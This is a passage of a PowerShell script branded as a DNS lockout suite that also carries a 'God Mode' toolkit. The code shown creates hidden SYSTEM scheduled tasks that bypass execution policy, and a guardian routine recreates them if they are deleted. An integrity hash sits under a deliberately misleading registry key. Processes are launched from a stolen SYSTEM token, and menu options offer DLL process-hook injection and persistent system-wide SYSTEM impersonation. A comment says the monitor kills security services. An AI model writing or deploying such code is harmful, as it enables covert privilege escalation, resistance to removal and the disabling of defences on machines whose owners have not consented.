            $Acl = Get-Acl -Path $RepKey -ErrorAction SilentlyContinue
            if ($Acl) {
                foreach ($Rule in $Acl.Access) {
                    if ($Rule.AccessControlType -eq 'Deny' -and ($Rule.IdentityReference.Value -match 'Administrators|Everyone|Authenticated Users')) {
                        $HasDeny = $true
                        break
                    }
                }
            }
        }
        if ($HasDeny) {
            Write-Host "  Registry ACL Hardening  : ACTIVE (Deny rules present)" -ForegroundColor Green
        } else {
            Write-Host "  Registry ACL Hardening  : INACTIVE" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Registry ACL Hardening  : UNKNOWN" -ForegroundColor DarkGray
    }

    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
}

function Get-MSYS2Root {
    try {
        $msysDir = Get-ChildItem -Path "C:\" -Directory -Recurse -Depth 1 -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq "msys64" } | Select-Object -First 1
        if ($msysDir) { return $msysDir.FullName }
    } catch {}
    return $null
}

function Get-MSYS2Path {
    # Hardcoded common paths (fast check)
    $MsysCandidates = @(
        "C:\msys64\ucrt64\bin",
        "C:\msys64\mingw64\bin",
        "C:\msys64\mingw32\bin"
    )
    foreach ($p in $MsysCandidates) {
        if (Test-Path (Join-Path $p "gcc.exe")) { return $p }
    }
    # Fallback: scan inside discovered MSYS2 root
    $root = Get-MSYS2Root
    if ($root) {
        try {
            $gcc = Get-ChildItem -Path $root -Filter "gcc.exe" -Recurse -Depth 3 -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($gcc) { return $gcc.DirectoryName }
        } catch {}
    }
    return $null
}

function Get-CompilerStatus {
    $compilers = @()
    if (Get-Command "cl" -ErrorAction SilentlyContinue) { $compilers += "MSVC" }
    if (Get-Command "x86_64-w64-mingw32-gcc" -ErrorAction SilentlyContinue) { $compilers += "MinGW-cross" }
    if (Get-Command "gcc" -ErrorAction SilentlyContinue) { $compilers += "MinGW/MSYS2" }
    else {
        $msysPath = Get-MSYS2Path
        if ($msysPath) { $compilers += "MSYS2 ($msysPath)" }
    }
    if ($compilers.Count -eq 0) {
        # Check if MSYS2 is installed but gcc is missing
        if (Get-MSYS2Root) {
            return "MSYS2-FOUND-NO-GCC"
        }
        return $null
    }
    return ($compilers -join ", ")
}

function Install-MSYS2GCC {
    param([string]$MsysRoot)
    $bashPaths = @(
        (Join-Path $MsysRoot "usr\bin\bash.exe"),
        (Join-Path $MsysRoot "msys2.exe")
    )
    $bash = $null
    foreach ($p in $bashPaths) {
        if (Test-Path $p) { $bash = $p; break }
    }
    if (-not $bash) {
        Write-Log -Message "MSYS2 bash not found in $MsysRoot. Cannot auto-install gcc." -Type "WARN" -Color Yellow
        Write-DebugLog -FunctionName "Install-MSYS2GCC" -Action "ERROR" -Message "bash.exe not found in $MsysRoot"
        return $false
    }
    
    Write-Log -Message "Auto-installing MinGW-w64 GCC via MSYS2 ($MsysRoot). This may take 2-5 minutes..." -Type "INFO" -Color Cyan
    Write-DebugLog -FunctionName "Install-MSYS2GCC" -Action "INFO" -Message "Starting pacman install in $MsysRoot"
    try {
        $env:MSYSTEM = "UCRT64"
        $env:MSYS2_PATH_TYPE = "inherit"
        $process = Start-Process -FilePath $bash -ArgumentList "-lc", "pacman -S mingw-w64-ucrt-x86_64-gcc --noconfirm" -WorkingDirectory $MsysRoot -Wait -PassThru -NoNewWindow
        if ($process.ExitCode -eq 0) {
            Write-Log -Message "GCC auto-install completed successfully." -Type "SUCCESS" -Color Green
            Write-DebugLog -FunctionName "Install-MSYS2GCC" -Action "SUCCESS" -Message "pacman install completed"
            return $true
        } else {
            Write-Log -Message "GCC auto-install failed with exit code $($process.ExitCode)." -Type "ERROR" -Color Red
            Write-DebugLog -FunctionName "Install-MSYS2GCC" -Action "ERROR" -Message "pacman exit code $($process.ExitCode)"
            return $false
        }
    } catch {
        Write-Log -Message "GCC auto-install exception: $_" -Type "ERROR" -Color Red
        Write-DebugLog -FunctionName "Install-MSYS2GCC" -Action "ERROR" -Message "Exception: $_"
        return $false
    }
}

function Get-QuickDNSLockStatus {
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }
    $SidAdmin = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )
        foreach ($SubKeyPath in $SubKeyPaths) {
            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadSubTree, [System.Security.AccessControl.RegistryRights]::ReadPermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            if (($RuleSid.Value -eq $SidAdmin.Value) -and $Rule.AccessControlType -eq "Deny") { return $true }
                        } catch {}
                    }
                    $RegKey.Close()
                }
            } catch {}
        }
    }
    return $false
}

# ============================================================================
# 8. CLI EXECUTION HANDLER
# ============================================================================

# Handle CLI Flags
if ($SilentLock) {
    # Self-integrity check: verify the installed script has not been tampered with
    $IntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    $IntegrityFile = Join-Path $InstallDir "integrity.sha256"
    $HashCheckPassed = $true

    # Primary check: registry stored hash (misleading key name)
    $ExpectedHash = $null
    try { $ExpectedHash = (Get-ItemProperty -Path $IntegrityRegPath -Name "PushConfigBackoffInterval" -ErrorAction Stop).PushConfigBackoffInterval } catch {}

    if ($ExpectedHash) {
        $ActualHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
        if ($ExpectedHash.Trim() -ne $ActualHash.Trim()) {
            Write-Log -Message "INTEGRITY FAILURE: Registry hash mismatch! Expected: $ExpectedHash  Actual: $ActualHash" -Type "SECURITY" -Color Red
            $HashCheckPassed = $false
        }
    } elseif (Test-Path $IntegrityFile) {
        # Fallback to file hash if registry key is missing
        $ExpectedHash = Get-Content -Path $IntegrityFile -Raw
        $ActualHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
        if ($ExpectedHash.Trim() -ne $ActualHash.Trim()) {
            Write-Log -Message "INTEGRITY FAILURE: File hash mismatch! Expected: $ExpectedHash  Actual: $ActualHash" -Type "SECURITY" -Color Red
            $HashCheckPassed = $false
        }
    }

    if (-not $HashCheckPassed) {
        Enable-DNSLock
        Exit
    }

    # Guardian: ensure main task still exists and recreate it if deleted
    $MainTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    if (-not $MainTask) {
        Write-Log -Message "Main task '$TaskName' is missing! Recreating from guardian..." -Type "SECURITY" -Color Red
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"
        $Trigger1 = New-ScheduledTaskTrigger -AtStartup
        $Trigger2 = New-ScheduledTaskTrigger -AtLogOn
        $CimClass = Get-CimClass -ClassName MSFT_TaskEventTrigger -Namespace "Root/Microsoft/Windows/TaskScheduler"
        $Trigger3 = New-CimInstance -CimClass $CimClass -ClientOnly
        $Trigger3.Subscription = "<QueryList><Query Id='0' Path='Microsoft-Windows-NetworkProfile/Operational'><Select Path='Microsoft-Windows-NetworkProfile/Operational'>*[System[EventID=10000]]</Select></Query></QueryList>"
        $Trigger3.Enabled = $True
        $PrincipalSettings = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2, $Trigger3) -Principal $PrincipalSettings -Force | Out-Null
    }

    Enable-DNSLock
    Exit
}
if ($Lock)       { Enable-DNSLock; Exit }
if ($Unlock)     { Disable-DNSLock; Exit }
if ($Install)    { Install-Persistence; Exit }
if ($Uninstall) {
    $CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
    $CurrentUserSid = [Security.Principal.WindowsIdentity]::GetCurrent().User
    if ($CurrentUserSid.Value -ne "S-1-5-18") {
        Write-Host "[SECURITY] CLI Uninstall denied: Must run as SYSTEM. Current user: $CurrentUser" -ForegroundColor Red
        Write-Host "Run from a SYSTEM shell (e.g., psexec -s powershell.exe -File `"$InstallScript`" -Uninstall)" -ForegroundColor Yellow
        Exit
    }
    Uninstall-Persistence
    Exit
}

# God Mode CLI Handlers
if ($ToggleOn) {
    if (-not (Test-BuiltInAdmin)) {
        $sidInfo = Get-CurrentUserSidInfo
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can use God Mode.`n" -ForegroundColor Red
        Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
        Exit 1
    }
    Enable-GodMode; Exit
}
if ($ToggleOff) {
    if (-not (Test-BuiltInAdmin)) {
        $sidInfo = Get-CurrentUserSidInfo
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can use God Mode.`n" -ForegroundColor Red
        Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
        Exit 1
    }
    Disable-GodMode; Exit
}
if ($GodModeStatus) { Show-GodModeStatus; Exit }
if ($Launch) {
    if (-not (Test-BuiltInAdmin)) {
        $sidInfo = Get-CurrentUserSidInfo
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can use God Mode.`n" -ForegroundColor Red
        Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
        Exit 1
    }
    Start-Monitoring; Exit
}
if ($InstallGodMode) {
    if (-not (Test-BuiltInAdmin)) {
        $sidInfo = Get-CurrentUserSidInfo
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can install God Mode.`n" -ForegroundColor Red
        Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
        Exit 1
    }
    Install-GodModePersistence; Exit
}
if ($UninstallGodMode) {
    if (-not (Test-BuiltInAdmin)) {
        $sidInfo = Get-CurrentUserSidInfo
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can uninstall God Mode.`n" -ForegroundColor Red
        Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
        Exit 1
    }
    Uninstall-GodModePersistence; Exit
}
if ($DumpLogs) {
    Export-GodModeLogs
    Exit
}
if ($ExportElevationDiagnostics) {
    $diagPath = Export-ElevationDiagnostics -Trigger "ManualCLI"
    if ($diagPath) {
        Write-Host "`n[SUCCESS] Elevation diagnostics exported to: $diagPath" -ForegroundColor Green
    } else {
        Write-Host "`n[ERROR] Failed to export elevation diagnostics." -ForegroundColor Red
    }
    Exit
}
if ($ElevateAllProcesses) {
    Invoke-ExistingProcessElevation
    Exit
}
if ($LaunchTaskMgrAsSystem) {
    Write-DebugLog -FunctionName "CLI-LaunchTaskMgrAsSystem" -Action "ENTRY"
    Enable-ElevationPrivileges

    # CreateProcessWithTokenW (used by [TokenOps]::CreateProcessFromToken below)
    # is serviced by the Secondary Logon service (seclogon). If seclogon is stopped
    # or disabled -- common on tweaked/optimized builds and some VMs -- every
    # SYSTEM launch via a stolen token fails (Win32 1460/1058) and Task Manager
    # falls back to an unelevated start. Best-effort ensure it is running first.
    try {
        $seclogon = Get-Service -Name seclogon -ErrorAction SilentlyContinue
        if ($seclogon) {
            if ($seclogon.StartType -eq 'Disabled') {
                Set-Service -Name seclogon -StartupType Manual -ErrorAction SilentlyContinue
                Write-DebugLog -FunctionName "CLI-LaunchTaskMgrAsSystem" -Action "INFO" -Message "seclogon was Disabled; set to Manual"
            }
            if ($seclogon.Status -ne 'Running') {
                Start-Service -Name seclogon -ErrorAction SilentlyContinue
                Write-DebugLog -FunctionName "CLI-LaunchTaskMgrAsSystem" -Action "INFO" -Message "seclogon start attempted"
            }
        }
    } catch {
        Write-DebugLog -FunctionName "CLI-LaunchTaskMgrAsSystem" -Action "WARN" -Message "seclogon ensure failed: $($_.Exception.Message)"
    }

    $systemPid = Find-SystemProcessCandidate
    # Resolve a real Task Manager image to launch. The legacy
    # $GodModeInstallDir\taskmgr_real.exe copy is only ever DELETED (in
    # Block/Unblock-TaskManager) and is never created anywhere in the script, so
    # Test-Path on it was almost always false and the SYSTEM launch was silently
    # skipped. Prefer the genuine System32 taskmgr.exe and only use the copy if it
    # happens to exist.
    $TaskMgrCopy = Join-Path $GodModeInstallDir "taskmgr_real.exe"
    if (Test-Path $TaskMgrCopy) {
        $TaskMgrTarget = $TaskMgrCopy
    } else {
        $TaskMgrTarget = Join-Path $env:WINDIR "System32\taskmgr.exe"
    }
    if ($systemPid -ne 0 -and (Test-Path $TaskMgrTarget)) {
        # Use CreateProcessFromToken -> CreateProcessWithTokenW, which only requires
        # SeImpersonatePrivilege (held by an interactive Administrator token). The
        # previous CreateProcessAsSystem -> CreateProcessAsUser path requires
        # SeAssignPrimaryTokenPrivilege, which Administrator does NOT hold, so it
        # always failed with Win32 error 1314 (ERROR_PRIVILEGE_NOT_HELD) and fell
        # back to an unelevated Start-Process -- the exact "it does not elevate to
        # system" symptom. CreateProcessAsUser remains correct when the caller is
        # already SYSTEM (used by the scheduled-task monitor via
        # Invoke-ParallelElevation), just not for this admin-CLI launcher.
        $result = [TokenOps]::CreateProcessFromToken($systemPid, $TaskMgrTarget, $TaskMgrTarget, $false)
        if ($result -eq 0) {
            Write-Log -Message "Task Manager launched as SYSTEM (via CreateProcessWithTokenW)." -Type "INFO" -Color Green
        } else {
            $errMsg = Get-Win32ErrorRootCause -ErrorCode $result -Context "CreateProcessWithTokenW"
            Write-Log -Message "Task Manager SYSTEM launch failed (error $($result): $($errMsg)). Falling back to normal launch." -Type "WARN" -Color Yellow
            Start-Process $TaskMgrTarget
        }
    } else {
        Write-Log -Message "No SYSTEM token or Task Manager image available for SYSTEM launch." -Type "WARN" -Color Yellow
        if (Test-Path $TaskMgrTarget) { Start-Process $TaskMgrTarget }
    }
    Write-DebugLog -FunctionName "CLI-LaunchTaskMgrAsSystem" -Action "EXIT"
    Exit
}
if ($LaunchShellAsSystem) {
    Write-DebugLog -FunctionName "CLI-LaunchShellAsSystem" -Action "ENTRY"
    if (-not (Test-BuiltInAdmin)) {
        $sidInfo = Get-CurrentUserSidInfo
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can launch a SYSTEM shell.`n" -ForegroundColor Red
        Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
        return
    }
    $null = Start-SystemShell -ShellName $Shell
    Write-DebugLog -FunctionName "CLI-LaunchShellAsSystem" -Action "EXIT"
    return
}
if ($SystemDesktop) {
    Start-SystemDesktopExplorer
    Exit
}
if ($InstallSystemDesktop) {
    Install-SystemDesktopSession; Exit
}
if ($UninstallSystemDesktop) {
    Uninstall-SystemDesktopSession; Exit
}

# If no flags are passed, load the Interactive Menu
do {
    Clear-Host
    Write-Host "=====================================================" -ForegroundColor Cyan
    Write-Host "   ENTERPRISE DNS LOCKOUT SUITE (INSTALLER EDITION)  " -ForegroundColor Cyan
    Write-Host "=====================================================" -ForegroundColor Cyan

    # God Mode discretion banner (shown every menu refresh): this suite grants
    # SYSTEM-level control over the machine (token theft, IAT hooking, SYSTEM
    # shell, a monitor that elevates every new process + kills security
    # services). Remind the operator to use discretion every time the menu
    # loads. Additive only -- does not alter any existing menu text or the
    # option-[10] monitor warning ("Launching God Mode Monitor will start a
    # persistent loop ... IRREVERSIBLE ..."), which stays intact per the
    # additive rule. Red when God Mode is currently ACTIVE (more urgent),
    # Yellow otherwise. One cheap reg read per menu refresh (menu redraws only
    # on keypress return, not a hot loop); $GodModeFlagRegPath/$GodModeFlagRegName
    # are already in scope here (used by the status header just below).
    $GmBannerActive = (Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue).$GodModeFlagRegName -eq 1
    if ($GmBannerActive) {
        Write-Host ">>> YOU ARE IN GOD MODE -- PLEASE USE DISCRETION, ADVISED <<<" -ForegroundColor Red
    } else {
        Write-Host ">>> GOD MODE TOOLKIT -- PLEASE USE DISCRETION, ADVISED <<<" -ForegroundColor Yellow
    }

    # Quick system status header
    $QuickGodMode = if ((Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue).$GodModeFlagRegName -eq 1) { "ACTIVE" } else { "INACTIVE" }
    $QuickGodModeColor = if ((Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue).$GodModeFlagRegName -eq 1) { "Red" } else { "Green" }
    $QuickDNS = Get-QuickDNSLockStatus
    $QuickDNSText = if ($QuickDNS) { "LOCKED" } else { "UNLOCKED" }
    $QuickDNSColor = if ($QuickDNS) { "Red" } else { "Green" }
    $QuickIntegrity = Test-IntegrityStatus
    $QuickIntColor = "DarkGray"; $QuickIntText = "N/A"
    if ($QuickIntegrity -eq $true) { $QuickIntColor = "Green"; $QuickIntText = "VERIFIED" }
    if ($QuickIntegrity -eq $false) { $QuickIntColor = "Red"; $QuickIntText = "TAMPERED" }
    $QuickAdmin = if (Test-BuiltInAdmin) { "YES" } else { "NO" }
    $QuickAdminColor = if (Test-BuiltInAdmin) { "Green" } else { "Yellow" }
    $QuickCompiler = Get-CompilerStatus
    if ($QuickCompiler -eq "MSYS2-FOUND-NO-GCC") {
        $QuickCompilerText = "MSYS2 FOUND (gcc missing)"
        $QuickCompilerColor = "Yellow"
    } elseif ($QuickCompiler) {
        $QuickCompilerText = "READY ($QuickCompiler)"
        $QuickCompilerColor = "Green"
    } else {
        $QuickCompilerText = "NOT FOUND"
        $QuickCompilerColor = "Yellow"
    }
    Write-Host "  God Mode: " -NoNewline -ForegroundColor DarkGray
    Write-Host $QuickGodMode -NoNewline -ForegroundColor $QuickGodModeColor
    Write-Host "  |  DNS Lock: " -NoNewline -ForegroundColor DarkGray
    Write-Host $QuickDNSText -NoNewline -ForegroundColor $QuickDNSColor
    Write-Host "  |  Integrity: " -NoNewline -ForegroundColor DarkGray
    Write-Host $QuickIntText -NoNewline -ForegroundColor $QuickIntColor
    Write-Host "  |  Built-in Admin: " -NoNewline -ForegroundColor DarkGray
    Write-Host $QuickAdmin -NoNewline -ForegroundColor $QuickAdminColor
    Write-Host "  |  C Compiler: " -NoNewline -ForegroundColor DarkGray
    Write-Host $QuickCompilerText -ForegroundColor $QuickCompilerColor
    if ($QuickCompiler -eq "MSYS2-FOUND-NO-GCC") {
        Write-Host "  [MSYS2 detected. Auto-install gcc will run when option 7 is pressed.]" -ForegroundColor Yellow
    }
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray

    Write-Host "`n-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  DNS PROTECTION    " -ForegroundColor Cyan
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[1] DEPLOY LOCK (Secure All Active Adapters)" -ForegroundColor Cyan
    Write-Host "[2] REMOVE LOCK (Ångra / Restore Access)" -ForegroundColor Yellow
    if (-not (Test-Path $InstallDir)) {
        Write-Host "[3] INSTALL SERVICE (Auto-Heal & Create 'dnslock' command)" -ForegroundColor Green
    }
    Write-Host "[4] UNINSTALL SERVICE (Remove background tasks & Unlock)" -ForegroundColor Red
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  SYSTEM            " -ForegroundColor White
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[5] REFRESH SYSTEM STATUS" -ForegroundColor Gray
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  GOD MODE (DANGEROUS)  " -ForegroundColor Magenta
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    if (-not (Test-Path $GodModeInstallDir)) {
        Write-Host "[6] INSTALL GOD MODE SERVICE (Auto-Enable & Create 'godmode' CLI)" -ForegroundColor Green
    } else {
        Write-Host "[6] UNINSTALL GOD MODE SERVICE (Remove background tasks)" -ForegroundColor Red
    }
    Write-Host "[7] ENABLE GOD MODE (Built-in Admin Only)" -ForegroundColor Magenta
    Write-Host "[8] DISABLE GOD MODE (Built-in Admin Only)" -ForegroundColor DarkMagenta
    Write-Host "[9] CHECK GOD MODE STATUS" -ForegroundColor Gray
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[10] LAUNCH GOD MODE MONITOR (Built-in Admin Only)" -ForegroundColor Magenta
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  SESSION           " -ForegroundColor White
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[11] DUMP LOGS TO DESKTOP" -ForegroundColor Cyan
    Write-Host "[12] EXIT TERMINAL" -ForegroundColor Gray
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[13] VERIFY SYSTEM CONTEXT" -ForegroundColor Cyan
Write-Host "[14] INSTALL/ENABLE PROCESS HOOK (gmhook.dll)" -ForegroundColor Cyan
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  TOKEN IMPERSONATION   " -ForegroundColor White
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    if ($script:__SystemImpersonationActive) {
        Write-Host "[15] DISABLE SYSTEM IMPERSONATION (Active)" -ForegroundColor Red
    } else {
        Write-Host "[15] IMPERSONATE SYSTEM TOKEN (Enable)" -ForegroundColor Magenta
    }
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    if (Test-PersistentSystemImpersonation) {
        Write-Host "[16] UNINSTALL PERSISTENT SYSTEM IMPERSONATION (Active)" -ForegroundColor Red
    } else {
        Write-Host "[16] INSTALL PERSISTENT SYSTEM IMPERSONATION (System-Wide + All PowerShell sessions)" -ForegroundColor Magenta
    }
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    if (Test-SystemDesktopSession) {
        Write-Host "[17] UNINSTALL SYSTEM DESKTOP SESSION (Active)" -ForegroundColor Red
    } else {
        Write-Host "[17] INSTALL SYSTEM DESKTOP SESSION (Run Explorer as SYSTEM)" -ForegroundColor Magenta
    }
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[18] RESET AUTO-EXCLUDE STORE (clear gmproxy SYSTEM-crash learnings)" -ForegroundColor Cyan
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[19] LAUNCH SHELL AS SYSTEM (cmd/powershell/pwsh/ise)" -ForegroundColor Magenta
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray

    $Choice = Read-Host "Select an administrative action (1-19)"
    $IntegrityStatus = Test-IntegrityStatus

    switch ($Choice) {
        "1" {
            if ($IntegrityStatus -eq $false) {
                Write-Host "`n[BLOCKED] Option [1] is disabled because the script has been tampered with." -ForegroundColor Red -BackgroundColor Black
                Write-Host "Use option [4] to uninstall, then reinstall from a clean source." -ForegroundColor Yellow
            } else {
                Enable-DNSLock
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "2" {
            if ($IntegrityStatus -eq $false) {
                Write-Host "`n[BLOCKED] Option [2] is disabled because the script has been tampered with." -ForegroundColor Red -BackgroundColor Black
                Write-Host "Use option [4] to uninstall, then reinstall from a clean source." -ForegroundColor Yellow
            } else {
                Disable-DNSLock
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "3" {
            if ($IntegrityStatus -eq $false) {
                Write-Host "`n[BLOCKED] Option [3] is disabled because the script has been tampered with." -ForegroundColor Red -BackgroundColor Black
                Write-Host "Use option [4] to uninstall, then reinstall from a clean source." -ForegroundColor Yellow
            } elseif (Test-Path $InstallDir) {
                Write-Warning "DNS-Guard is already installed. Option [3] is unavailable."
            } else {
                Install-Persistence
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "4" { Uninstall-Persistence; Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") }
        "5" {
            Show-GodModeStatus
            Get-DNSLockStatus | Out-Null
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "6" {
            if (-not (Test-BuiltInAdmin)) {
                $sidInfo = Get-CurrentUserSidInfo
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can use God Mode.`n" -ForegroundColor Red
                Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
            } else {
                $IsInstalled = (Test-Path $GodModeInstallScript) -and (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue)
                if (-not $IsInstalled) {
                    Install-GodModePersistence
                    Write-Host "God Mode service installed." -ForegroundColor Green
                } else {
                    Uninstall-GodModePersistence
                    Write-Host "God Mode service uninstalled." -ForegroundColor Yellow
                }
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "7" {
            if (-not (Test-BuiltInAdmin)) {
                $sidInfo = Get-CurrentUserSidInfo
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can use God Mode.`n" -ForegroundColor Red
                Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
            } else {
                Enable-GodMode
                Write-Host "God Mode enabled." -ForegroundColor Green
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "8" {
            if (-not (Test-BuiltInAdmin)) {
                $sidInfo = Get-CurrentUserSidInfo
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can use God Mode.`n" -ForegroundColor Red
                Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
            } else {
                Disable-GodMode
                Write-Host "God Mode disabled." -ForegroundColor Yellow
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "9" { Show-GodModeStatus; Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") }
        "13" { Test-SystemContext; Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") }
        "14" {
            if (-not (Test-BuiltInAdmin)) {
                $sidInfo = Get-CurrentUserSidInfo
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can install the process hook.`n" -ForegroundColor Red
                Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
            } else {
                $hookOk = Install-ProcessHook
                if ($hookOk) {
                    Write-Host "`n[SUCCESS] Process hook installed and injected." -ForegroundColor Green
                } else {
                    Write-Host "`n[WARNING] Process hook installation reported issues. Check logs for details." -ForegroundColor Yellow
                }
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "15" {
            if ($script:__SystemImpersonationActive) {
                Disable-SystemImpersonation
            } else {
                if (-not (Test-BuiltInAdmin)) {
                    $sidInfo = Get-CurrentUserSidInfo
                    Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can impersonate SYSTEM.`n" -ForegroundColor Red
                    Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
                } else {
